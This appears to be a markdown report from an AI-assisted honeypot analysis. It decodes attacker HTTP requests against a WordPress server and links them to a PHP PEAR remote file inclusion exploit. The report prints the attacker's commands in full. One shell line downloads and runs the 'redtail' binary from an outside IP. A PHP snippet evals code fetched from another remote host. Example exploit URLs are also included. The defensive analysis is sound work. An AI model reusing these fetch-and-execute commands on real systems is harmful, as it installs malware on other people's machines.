> `Your role is to answer questions about an attack on a Linux honeypot. You will analyze the commands executed, uploaded/downloaded files, HTTP requests, sessionsand other data logged during the attack to understand the methods and goals of the attacker.You will also analyze OSINT data gathered about the attacking IP(s) including: geolocation, open ports, running services, threatfeed reports and reports of known malware associated with the IP(s) to get additional context on the attack and enhance your analysis. Your answers will be used in a GitHub .md file so you should use markdown syntax to format your output. Use the available functions to request relevant information to thoroughly answer each question. You should use multiple function calls to analyze the data returned by previous function calls and to get any additional data you need to answer each question as accurately as possible. For example if you see that the attacker downloaded malware in one of the commands executed, you should use the get_attack_attrs function with the arguement 'uniq_malware' to get a list of unique malware_ids associated with the attack, then use get_malware_attrs to analyze the malware, and the query_ functions to get additional OSINT data about the malware and its source. IMPORTANT: When using get_attack_attrs use the uniq_<attr> modifier first and only get all values if necessary after analyzing the unique values. For context that the honeypot system has the following open ports: Port 80: Web server running Apache httpd 3.2.3 and WordPress 5.6.7 Port 8080: Web server running Apache httpd 3.2.3 and WordPress 5.6.7  Its internal IP address is: 172.31.5.68 and its external IP address is: 54.67.87.80. Use Python when needed to enhance your analysis. For example if you find an encoded string in the http_requests, commands, or malware, you should write and execute code to decode it, then analyze the decoded result in context when answering questions.`

It seems that there are no commands logged in the data provided for the attack on the Linux honeypot. Without command logs, it's not possible to determine if a specific exploit is being used based on the command execution.

If you have any more data, such as HTTP requests, file uploads, or sessions that could hint at an exploit being used, please provide that data for further analysis. Otherwise, if there is a specific text snippet, code, or string that could be associated with an exploit, I could search the ExploitDB for potential matches.

## Prompt: look at the http requests and try to decode the attack and determine the exploit used

**Run ID:** `run_Tn2ypv4Ni2VjC6tIsVtM8Bv1`

<h3>Answer</h3>
</summary>

By analyzing the decoded commands extracted from the HTTP requests found in the attack on the Linux honeypot, we can determine the exploit used by the attacker. Here are the decoded commands:

1. Command 1:
   - **Command**: `mkdir -p /tmp/$(whoami) && cd /tmp/$(whoami); wget http://45.95.147.236/download/redtail.x86_64; curl -O http://45.95.147.236/download/redtail.x86_64; rm -rf .redtail; mv redtail.x86_64 .redtail; chmod +x .redtail; ./.redtail`
   - **Description**: This command creates a directory in `/tmp` using the current user's name, downloads a file `redtail.x86_64` from a remote server (hosted at IP address 45.95.147.236), renames the downloaded file, makes it executable, and executes it.

2. Command 2 and 3:
   - **Commands**: 
     - ```
       if(filter_var(ini_get("allow_url_fopen"),FILTER_VALIDATE_BOOLEAN)){eval(file_get_contents("http://93.123.39.76/x"));}
       else{$h=curl_init("http://93.123.39.76/x");curl_setopt($h,CURLOPT_RETURNTRANSFER,1);curl_setopt($h,CURLOPT_HEADER,0);eval(curl_exec($h));curl_close($h);}
       ```
   - **Description**: These commands check if `allow_url_fopen` is enabled in the PHP configuration. If it is enabled, they fetch and evaluate the content from a remote URL `http://93.123.39.76/x` using `file_get_contents`. If `allow_url_fopen` is disabled, they use cURL to fetch the content and then evaluate it.

Based on the decoded commands, it appears that the attacker is attempting to download and execute a malicious file `redtail.x86_64` from remote servers. Additionally, the attacker is exploiting the ability to execute arbitrary code in PHP by using functions like `eval` to fetch and execute remote code.

These actions indicate a potential exploit that involves downloading and executing malicious files, as well as leveraging PHP functions to execute arbitrary commands. The attacker is likely attempting to gain unauthorized access or perform malicious activities on the compromised system.

The search for the term "pearcmd" in the ExploitDB database has returned an exploit with the following details:

- **Exploit ID**: 11442
- **Title**: PHP PEAR 1.9.0 - Multiple Remote File Inclusions
- **Type**: webapps
- **Platform**: PHP
- **Date Published**: 2010-02-14

Based on this information, the exploit related to the "pearcmd" value found in the HTTP requests is the PHP PEAR 1.9.0 - Multiple Remote File Inclusions exploit. The attacker is likely leveraging this exploit to perform remote file inclusions and execute unauthorized code on the targeted system.

This exploit allows an attacker to include remote files and potentially execute malicious code, leading to unauthorized access and potential security risks on the vulnerable system.

<h3>Answer</h3>

The exploit related to the PHP PEAR 1.9.0 - Multiple Remote File Inclusion vulnerability works by exploiting a weakness in the PEAR (PHP Extension and Application Repository) version 1.9.0. Here is an overview of how the exploit works:

- **Vulnerability Type**: Remote File Inclusion
- **Author**: eidelweiss
- **Date**: 2010-02-14
- **Location**: Indonesia
- **Contact**: g1xsystem [at] windowslive [dot] com

### Vulnerability Details:
The vulnerability in the PEAR package allows an attacker to remotely include and execute arbitrary files on the target system. The vulnerable code snippet in PEAR that can be exploited is as follows:
```php
if ('../DIRECTORY_SEPARATOR/PEAR' != '@'.'include_path'.'@') {
    ini_set('include_path', '../DIRECTORY_SEPARATOR/PEAR');
    $raw = true;
}
@ini_set('allow_url_fopen', true);
if (!ini_get('safe_mode')) {
    @set_time_limit(0);
}
$_PEAR_PHPDIR = '#$%^&*';
define('PEAR_RUNTYPE', 'pecl');
require_once 'pearcmd.php';
require_once 'PEAR.php';
require_once 'PEAR/Frontend.php';
require_once 'PEAR/Config.php';
require_once 'PEAR/Command.php';
require_once 'Console/Getopt.php';
```
### Exploit:
The attacker can exploit the vulnerability by crafting specific requests to the target system. This includes accessing vulnerable URLs on the target server to execute potentially malicious code. The exploit URLs typically take the following form:
- `http://victim.com/[DIRECTORY_SEPARATOR]/PEAR_DIR/PEAR.php?include_path=[Shell.txt?]`
- `http://victim.com/[DIRECTORY_SEPARATOR]/PEAR_DIR/PEAR.php?_PEAR_PHPDIR =[Shell.txt?]`

By manipulating the `include_path` or `_PEAR_PHPDIR` parameters in the URLs, the attacker can include remote files containing malicious code (e.g., `Shell.txt`) and potentially gain unauthorized access or perform malicious actions on the target system.

This exploit demonstrates the risk posed by the vulnerability in the PEAR package, allowing attackers to exploit remote file inclusions and execute arbitrary code on the affected system.
